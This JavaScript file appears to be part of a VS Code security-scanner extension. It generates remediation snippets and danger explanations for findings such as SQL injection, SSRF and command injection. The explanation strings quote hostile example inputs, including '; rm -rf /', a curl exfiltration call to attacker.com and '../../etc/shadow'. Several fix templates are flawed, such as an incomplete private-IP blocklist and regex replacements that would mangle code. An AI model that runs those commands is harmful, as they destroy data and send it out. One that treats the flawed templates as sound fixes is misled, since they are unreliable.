/**
 * SmartRemediator — intelligent contextual fix & recommendation engine
 * 
 * For each finding, produces:
 *   - Line-precise highlight range (the exact offending expression)
 *   - Strong, language-aware remediation snippet
 *   - "Why this is dangerous" explanation
 *   - Secure alternative code
 *   - CWE/OWASP reference links
 */

// Gracefully handle missing vscode module (CLI usage)
let vscode;
try {
    vscode = require('vscode');
} catch {
    vscode = null;
}

// ─── SECURE CODE TEMPLATES PER LANGUAGE ─────────────────────────────
const FIX_TEMPLATES = {
    'sql-injection': {
        python: {
            oldPattern: null, // matched regex
            newCode: (ctx) => {
                if (ctx.match?.includes('execute')) {
                    return ctx.line.includes('%') || ctx.line.includes('.format') || ctx.line.includes('f"')
                        ? ctx.line.replace(/execute\s*\([^)]*\)/i, `execute("${ctx.probableQuery || 'SELECT * FROM users WHERE id = %s'}", (user_input,))  # 🛡️ Parameterized`)
                        : ctx.line;
                }
                return ctx.line.replace(/\$[^)]+/, '($1, user_input)').replace(/%[^)]+/, '(%s, user_input)');
            },
        },
        javascript: {
            newCode: (ctx) => {
                if (ctx.lang === 'typescript') ctx.lang = 'javascript';
                return ctx.line.replace(/`[^`]*`/, '`${sanitize(input)}` /* 🛡️ Use parameterized ORM */')
                    .replace(/\+\s*\w+/, '+ sanitize(input) /* 🛡️ Sanitize input */');
            },
        },
        default: {
            newCode: (ctx) => `/* 🛡️ CH3CK3R: Use parameterized query instead of string interpolation */`,
        },
    },
    'hardcoded-api-key': {
        python: {
            newCode: (ctx) => {
                const key = ctx.match?.match(/['"](\w+)['"]/)?.[1] || 'SECRET_KEY';
                return ctx.line.replace(/['"][^'"]+['"]/, `os.environ.get("${key}", "")  # 🛡️ Rotate & move to env`);
            },
        },
        javascript: {
            newCode: (ctx) => {
                const key = ctx.match?.match(/['"](\w+)['"]/)?.[1] || 'API_KEY';
                return ctx.line.replace(/['"][^'"]+['"]/, `process.env.${key} || ''  // 🛡️ Move to environment`);
            },
        },
        go: {
            newCode: (ctx) => {
                const key = ctx.match?.match(/['"](\w+)['"]/)?.[1] || 'SECRET';
                return ctx.line.replace(/['"][^'"]+['"]/, `os.Getenv("${key}")  // 🛡️ Never hardcode secrets`);
            },
        },
        java: {
            newCode: (ctx) => ctx.line.replace(/['"][^'"]+['"]/, `System.getenv("SECRET")  // 🛡️ Externalize secrets`),
        },
        default: {
            newCode: (ctx) => ctx.line + `  // 🛡️ CH3CK3R: Hardcoded credential — move to env variables / secret store`,
        },
    },
    'weak-jwt-secret': {
        default: {
            newCode: (ctx) => ctx.line.replace(/['"][^'"]+['"]/, `process.env.JWT_SECRET || require('crypto').randomBytes(64).toString('hex')  // 🛡️ Use long, env-based secret`),
        },
    },
    'ssrf-vulnerability': {
        python: {
            newCode: (ctx) => {
                if (ctx.line.includes('requests.get') || ctx.line.includes('requests.post')) {
                    return `# 🛡️ CH3CK3R: Validate URL before use\n# Block internal IPs: 10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x\nallowed_domains = ["api.trusted.com"]\nurl = user_input\nif not any(url.startswith(d) for d in allowed_domains):\n    raise ValueError("Untrusted URL")\n${ctx.line}`;
                }
                return ctx.line;
            },
        },
        javascript: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Validate + sanitize URL before fetch\n// Block: 10.x.x.x, 172.16-31.x.x, 192.168.x.x, 127.x.x.x, 169.254.x.x\nconst { URL } = require('url');\ntry {\n  const parsed = new URL(userInput);\n  const blockedIPs = ['10.', '172.16', '192.168', '127.', '169.254'];\n  if (blockedIPs.some(ip => parsed.hostname.startsWith(ip))) throw new Error('Blocked');\n} catch(e) { throw new Error('Invalid URL'); }\n${ctx.line}`,
        },
        default: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Validate URL — block private IP ranges\n${ctx.line}`,
        },
    },
    'cors-wildcard': {
        default: {
            newCode: (ctx) => ctx.line.replace(/\*/, '"https://your-frontend.com"').replace(/'?'\*'?'/, '"https://your-frontend.com"') + `  // 🛡️ Restrict to specific origins`,
        },
    },
    'missing-auth-check': {
        python: {
            newCode: (ctx) => `@jwt_required()  # 🛡️ CH3CK3R: Missing authentication\n${ctx.line}`,
        },
        javascript: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Add auth middleware — authenticateJWT, requireAuth\n${ctx.line}`,
        },
        go: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Add auth middleware — r.Use(authMiddleware)\n${ctx.line}`,
        },
        java: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Add @PreAuthorize or security filter\n${ctx.line}`,
        },
        default: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Missing authorization check — add authentication guard`,
        },
    },
    'path-traversal': {
        python: {
            newCode: (ctx) => ctx.line.replace(/open\([^)]*\)/, `open(os.path.normpath(os.path.join("/safe/dir", os.path.basename(user_input))))  # 🛡️ Restrict to safe root`),
        },
        default: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Sanitize path — use basename() + safe root directory`,
        },
    },
    'command-injection': {
        python: {
            newCode: (ctx) => ctx.line.replace(/os\.system/, `# 🛡️ Use subprocess with args list instead\nimport subprocess\nsubprocess.run`).replace(/subprocess\.call\([^)]*shell=True[^)]*\)/, `subprocess.run(["command", "arg1"], capture_output=True)`),
        },
        default: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Use execFile/spawn with separate arguments — never shell interpolation`,
        },
    },
    'disable-ssl-verification': {
        default: {
            newCode: (ctx) => ctx.line.replace(/verify\s*=\s*False|verify=false/i, 'verify=True  // 🛡️ Never disable SSL').replace(/rejectUnauthorized\s*:\s*false/i, 'rejectUnauthorized: true  // 🛡️ Never disable SSL'),
        },
    },
    'no-rate-limit': {
        default: {
            newCode: (ctx) => `# 🛡️ CH3CK3R: Add rate limiting\n# from flask_limiter import Limiter\n# limiter = Limiter(app, key_func=lambda: request.remote_addr)\n# @limiter.limit("100/hour")\n${ctx.line}`,
        },
    },
    'idor': {
        default: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Verify resource ownership\n// const resource = await findResource(id);\n// if (resource.ownerId !== req.user.id) return res.status(403).send('Forbidden');\n${ctx.line}`,
        },
    },
    'mass-assignment': {
        default: {
            newCode: (ctx) => `// 🛡️ CH3CK3R: Whitelist allowed fields — do not pass request body directly\n// const allowed = ['name', 'email'];\n// const safeData = pick(req.body, allowed);\n${ctx.line}`,
        },
    },
};

// ─── "WHY THIS IS DANGEROUS" EXPLANATIONS ──────────────────────────
const DANGER_EXPLANATIONS = {
    'sql-injection': {
        short: '🚨 Attacker can execute arbitrary SQL commands — read, modify, or delete your entire database.',
        detail: `SQL injection is the #1 web vulnerability (OWASP Top 10). When user input is concatenated into SQL strings, an attacker can inject ' OR 1=1 -- to bypass auth, UNION SELECT to steal data, or DROP TABLE to destroy data. Always use parameterized queries — the database handles escaping automatically.`,
    },
    'hardcoded-api-key': {
        short: '🚨 Anyone with access to your source code (git, npm, employees) has your credentials.',
        detail: `Hardcoded secrets are the #1 cause of credential leaks. GitHub scans for them (and will alert your users). AWS keys in source code = $50K+ crypto mining bills overnight. Use environment variables (process.env / os.environ) or a secrets manager (Vault, AWS Secrets Manager).`,
    },
    'weak-jwt-secret': {
        short: '🚨 Weak JWT secret = attacker can forge any token and impersonate any user.',
        detail: `JWT tokens signed with a weak secret can be cracked offline with hashcat/jwt_tool. Once cracked, the attacker can forge tokens as any user (admin, other users). Use a 256+ bit random secret from a cryptographically secure RNG.`,
    },
    'ssrf-vulnerability': {
        short: '🚨 Attacker can use your server as a proxy to attack internal services (cloud metadata, databases).',
        detail: `SSRF lets attackers bypass firewalls by making requests FROM your server. AWS/GCP/Azure metadata endpoints (169.254.169.254) expose IAM credentials. Internal Redis/Memcached/Elasticsearch can be exploited. Validate URLs against an allowlist and block private IP ranges.`,
    },
    'cors-wildcard': {
        short: '🚨 Any website can read your API responses — including attacker pages that steal user data.',
        detail: `Access-Control-Allow-Origin: * allows any website to make authenticated cross-origin requests. Combined with cookies, this enables CSRF-style data exfiltration. Always set specific origins (your frontend domain only).`,
    },
    'missing-auth-check': {
        short: '🚨 Anyone on the internet can call this endpoint — no authentication required.',
        detail: `API endpoints without auth are the #1 API security risk. Attackers scan for unprotected endpoints. If this endpoint handles user data, it's a data breach waiting to happen. Every production endpoint needs authentication verification.`,
    },
    'path-traversal': {
        short: '🚨 Attacker can read ANY file on your server (configs, passwords, /etc/shadow).',
        detail: `Using user input in file paths without validation lets attackers read ../../etc/passwd or ../../etc/shadow. Combine with basename() and restrict to a well-defined safe root directory. Never use user input in paths directly.`,
    },
    'command-injection': {
        short: '🚨 Attacker can execute arbitrary commands on your server — full remote code execution.',
        detail: `Passing user input to shell commands gives the attacker full control. ; rm -rf / or | curl attacker.com/exfil are trivial. Use execFile/spawn with arguments as an array (never shell: true).`,
    },
    'disable-ssl-verification': {
        short: '🚨 Man-in-the-middle attack — anyone on the network can read/modify your API traffic.',
        detail: `Disabling SSL verification means your client accepts ANY TLS certificate, including attacker-issued ones. On public WiFi, coffee shop, or cloud, this exposes all data in transit. Never set verify=False in production.`,
    },
    'no-rate-limit': {
        short: '🚨 Attacker can brute-force authentication or exhaust your API with unlimited requests.',
        detail: `Without rate limiting, an attacker can try 1M passwords/minute (account takeover), scrape your entire database (data theft), or cause a denial of service (costs $$$ on cloud). Implement rate limiting per-IP and per-user.`,
    },
    'idor': {
        short: '🚨 Attacker can access ANY user\'s data by changing an ID parameter.',
        detail: `Insecure Direct Object Reference lets attackers enumerate resources by incrementing IDs. If user A can access user B's data by changing /api/user/1 to /api/user/2, you have an IDOR. Always verify the authenticated user OWNS the requested resource.`,
    },
    'mass-assignment': {
        short: '🚨 Attacker can set fields you never intended — like is_admin=true or role=superuser.',
        detail: `Passing request body directly to a database create/update lets attackers set arbitrary fields. If your user model has an "is_admin" field, an attacker can set it via the API. Whitelist acceptable fields explicitly.`,
    },
    'prototype-pollution': {
        short: '🚨 Attacker can inject properties into Object.prototype — affecting all objects in your app.',
        detail: `Prototype pollution via __proto__ or constructor.prototype lets attackers bypass authentication, change app behavior, or execute code. Never merge untrusted user input with Object.assign or spread operator without validation.`,
    },
    'unversioned-api': {
        short: '🚨 API changes break clients with no migration path — version mismatch causes silent failures.',
        detail: `Without API versioning (v1, v2), you can't evolve your API safely. Old clients break when you change endpoints. Use URL-based (/api/v1/users) or header-based (Accept: version=1) versioning.`,
    },
    'debug-mode-enabled': {
        short: '🚨 Stack traces expose your entire application internals to attackers.',
        detail: `Debug mode shows full stack traces, SQL queries, local variables, and framework internals. Attackers use this to find injection points, library versions, and configuration secrets. Never run debug mode in production.`,
    },
    'graphql-introspection': {
        short: '🚨 Anyone can dump your entire GraphQL schema — every query, type, and field.',
        detail: `Introspection exposes your entire data model and operations. Attackers use this to find undocumented fields, deprecated queries, and hidden mutation endpoints. Disable in production.`,
    },
};

class SmartRemediator {
    constructor(findingsStore, configManager) {
        this.findingsStore = findingsStore;
        this.configManager = configManager;
    }

    /**
     * Get the precise highlight range for a finding in a document
     * Finds the EXACT offending expression, not just the line
     */
    getHighlightRange(document, finding) {
        const lineIdx = Math.max(0, (finding.line || 1) - 1);
        if (lineIdx >= document.lineCount) {
            return new vscode.Range(0, 0, 0, 1);
        }

        const line = document.lineAt(lineIdx);
        const text = line.text;

        // Try to find the exact match substring
        if (finding.match && text.includes(finding.match)) {
            const idx = text.indexOf(finding.match);
            return new vscode.Range(lineIdx, idx, lineIdx, idx + finding.match.length);
        }

        // Try regex match clues
        for (const keyword of this._matchKeywords(finding.ruleId || '')) {
            const idx = text.toLowerCase().indexOf(keyword);
            if (idx >= 0) {
                return new vscode.Range(lineIdx, idx, lineIdx, idx + keyword.length);
            }
        }

        // Default: highlight around line content
        const trimmed = text.trimStart();
        const leadingWs = text.length - trimmed.length;
        const contentLen = Math.min(trimmed.length, 60);
        return new vscode.Range(lineIdx, leadingWs, lineIdx, leadingWs + contentLen);
    }

    /**
     * Build a rich, contextual remediation for a finding
     */
    getRemediation(finding, language) {
        const ruleId = finding.ruleId || '';
        const lang = (language || finding.language || 'javascript').toLowerCase();

        // Danger explanation
        const danger = DANGER_EXPLANATIONS[ruleId] || {
            short: '🚨 Security issue detected — review and fix before deploying to production.',
            detail: `This vulnerability could be exploited by an attacker. See OWASP reference for details.`,
        };

        // Fix code
        const templates = FIX_TEMPLATES[ruleId] || {};
        const langTemplate = templates[lang] || templates[lang.split('-')[0]] || templates.default;

        const ctx = {
            line: finding.match || '',
            match: finding.match,
            lang: lang,
            probableQuery: this._guessQueryContext(finding),
            filePath: finding.file,
            ruleId,
        };

        const fixCode = langTemplate?.newCode ? langTemplate.newCode(ctx) : `// 🛡️ CH3CK3R: Fix required — ${finding.title}`;

        return {
            line: finding.line,
            column: finding.column,
            fixCode,
            explanation: danger.short,
            detailExplanation: danger.detail,
            severity: finding.severity,
            severityLabel: this._severityLabel(finding.severity),
            ruleName: finding.title,
            cwe: finding.cwe_id ? `CWE-${finding.cwe_id}` : null,
            owasp: finding.owasp_category,
            references: [
                finding.owasp_category ? {
                    label: 'OWASP API Security Top 10',
                    url: 'https://owasp.org/API-Security/editions/2023/en/',
                } : null,
                finding.cwe_id ? {
                    label: `CWE-${finding.cwe_id} Detail`,
                    url: `https://cwe.mitre.org/data/definitions/${finding.cwe_id}.html`,
                } : null,
                {
                    label: 'Ch3ck3r Docs',
                    url: 'https://github.com/msabenda/ch3ck3r',
                },
            ].filter(Boolean),
        };
    }

    /**
     * Build VS Code diagnostic for a finding with precise range + intelligent message
     */
    buildDiagnostic(document, finding) {
        // CLI mode fallback
        if (!vscode) return null;

        const severityMap = {
            critical: vscode.DiagnosticSeverity.Error,
            high: vscode.DiagnosticSeverity.Error,
            medium: vscode.DiagnosticSeverity.Warning,
            low: vscode.DiagnosticSeverity.Information,
            info: vscode.DiagnosticSeverity.Information,
        };
        const severity = severityMap[finding.severity] || vscode.DiagnosticSeverity.Warning;
        const range = this.getHighlightRange(document, finding);

        const danger = DANGER_EXPLANATIONS[finding.ruleId || ''];
        const message = danger
            ? `🛡️ ${finding.title}: ${danger.short}`
            : `🛡️ ${finding.title}: ${finding.description.substring(0, 120)}`;

        const diagnostic = new vscode.Diagnostic(range, message, severity);
        diagnostic.source = 'Ch3ck3r';
        diagnostic.code = {
            value: finding.ruleId || 'ch3ck3r',
            target: vscode.Uri.parse(
                finding.cwe_id
                    ? `https://cwe.mitre.org/data/definitions/${finding.cwe_id}.html`
                    : 'https://github.com/msabenda/ch3ck3r'
            ),
        };
        diagnostic.tags = finding.severity === 'critical' || finding.severity === 'high'
            ? [vscode.DiagnosticTag.Unnecessary]
            : [];

        const related = [];
        if (finding.owasp_category) {
            related.push(new vscode.DiagnosticRelatedInformation(
                new vscode.Location(
                    vscode.Uri.parse('https://owasp.org/API-Security/editions/2023/en/'),
                    new vscode.Position(0, 0)
                ),
                `OWASP: ${finding.owasp_category}`
            ));
        }
        if (finding.cwe_id) {
            related.push(new vscode.DiagnosticRelatedInformation(
                new vscode.Location(
                    vscode.Uri.parse(`https://cwe.mitre.org/data/definitions/${finding.cwe_id}.html`),
                    new vscode.Position(0, 0)
                ),
                `CWE-${finding.cwe_id}: Click for details`
            ));
        }
        const remediation = finding.remediation || '';
        if (remediation) {
            related.push(new vscode.DiagnosticRelatedInformation(
                new vscode.Location(document.uri, range),
                `💡 Fix: ${remediation.substring(0, 100)}`
            ));
        }
        diagnostic.relatedInformation = related;
        return diagnostic;
    }

    buildHoverContent(finding, language) {
        if (!vscode) return null;
        const remediation = this.getRemediation(finding, language);
        const markdown = new vscode.MarkdownString('', true);
        markdown.isTrusted = true;
        markdown.supportHtml = true;
        markdown.supportThemeIcons = true;

        const emoji = finding.severity === 'critical' ? '🟥' :
                      finding.severity === 'high' ? '🟧' :
                      finding.severity === 'medium' ? '🟨' : '🟩';
        markdown.appendMarkdown(`${emoji} **Ch3ck3r SAST** — _${remediation.severityLabel}_\n\n`);
        markdown.appendMarkdown(`**${finding.title}**\n\n`);
        markdown.appendMarkdown(`> ${remediation.explanation}\n\n`);

        markdown.appendMarkdown('---\n\n');
        if (finding.owasp_category) {
            markdown.appendMarkdown(`📋 **OWASP:** ${finding.owasp_category}\n\n`);
        }
        if (remediation.cwe) {
            markdown.appendMarkdown(`📋 **CWE:** [${remediation.cwe}](https://cwe.mitre.org/data/definitions/${finding.cwe_id}.html)\n\n`);
        }

        markdown.appendMarkdown('---\n\n');
        markdown.appendMarkdown('### 💡 Fix It\n\n');
        markdown.appendMarkdown('```\n');
        markdown.appendMarkdown(`${remediation.fixCode}\n`);
        markdown.appendMarkdown('```\n\n');

        markdown.appendMarkdown(`[Apply Fix](command:ch3ck3r.remediateFinding?${encodeURIComponent(JSON.stringify(finding))})`);
        markdown.appendMarkdown(' · ');
        markdown.appendMarkdown(`[Dismiss](command:ch3ck3r.dismissFinding?${encodeURIComponent(JSON.stringify(finding))})`);
        markdown.appendMarkdown(' · ');
        markdown.appendMarkdown(`[Learn More](command:ch3ck3r.showReport)`);

        return markdown;
    }

    buildCodeActions(document, range, finding) {
        if (!vscode) return [];
        const actions = [];
        const remediation = this.getRemediation(finding, document.languageId);

        const fixAction = new vscode.CodeAction(
            `🛡️ Apply fix: ${finding.title}`,
            vscode.CodeActionKind.QuickFix
        );
        fixAction.edit = new vscode.WorkspaceEdit();
        fixAction.edit.replace(document.uri, range, remediation.fixCode);
        fixAction.diagnostics = [this.buildDiagnostic(document, finding)];
        actions.push(fixAction);

        const explainAction = new vscode.CodeAction(
            `📖 Why is this dangerous?`,
            vscode.CodeActionKind.QuickFix
        );
        explainAction.command = {
            command: 'ch3ck3r.showExplanation',
            title: 'Show Security Explanation',
            arguments: [finding, remediation],
        };
        actions.push(explainAction);

        if (finding.cwe_id) {
            const docAction = new vscode.CodeAction(
                `📋 View CWE-${finding.cwe_id} details`,
                vscode.CodeActionKind.Information
            );
            docAction.command = {
                command: 'vscode.open',
                title: 'Open CWE',
                arguments: [vscode.Uri.parse(`https://cwe.mitre.org/data/definitions/${finding.cwe_id}.html`)],
            };
            actions.push(docAction);
        }

        const dismissAction = new vscode.CodeAction(
            `⏭️ Dismiss finding`,
            vscode.CodeActionKind.QuickFix
        );
        dismissAction.command = {
            command: 'ch3ck3r.dismissFinding',
            title: 'Dismiss',
            arguments: [finding],
        };
        actions.push(dismissAction);

        return actions;
    }

    // ─── PRIVATE HELPERS ──────────────────────────────────────────

    _severityLabel(severity) {
        const labels = {
            critical: 'CRITICAL ⚠️ Immediate action required',
            high: 'HIGH ⚠️ Should fix before deployment',
            medium: 'MEDIUM ⚡ Review and fix soon',
            low: 'LOW 📝 Consider addressing',
            info: 'INFO ℹ️ For awareness',
        };
        return labels[severity] || severity;
    }

    _matchKeywords(ruleId) {
        const map = {
            'sql-injection': ['SELECT', 'INSERT', 'DELETE', 'UPDATE', 'query', 'execute'],
            'hardcoded-api-key': ['api_key', 'API_KEY', 'secret', 'password', 'token'],
            'ssrf-vulnerability': ['fetch(', 'axios.get(', 'request(', 'http.get', 'https://'],
            'cors-wildcard': ['*', 'Access-Control', 'allow_origins'],
            'missing-auth-check': ['app.', 'router.', 'route', 'handler'],
            'path-traversal': ['open(', 'readFile', 'readFileSync', 'path.join'],
            'command-injection': ['exec(', 'system(', 'shell_exec', 'spawn('],
            'idor': [':id', ':userId', 'DELETE', 'findById'],
            'mass-assignment': ['create(', 'update(', 'save(', 'all('],
            'no-rate-limit': ['@app.', 'app.', 'router.'],
        };
        return map[ruleId] || [];
    }

    _guessQueryContext(finding) {
        const match = finding.match || '';
        if (match.includes('users')) return 'SELECT * FROM users WHERE id = %s';
        if (match.includes('product')) return 'SELECT * FROM products WHERE id = %s';
        return 'SELECT * FROM records WHERE id = %s';
    }
}

module.exports = { SmartRemediator };
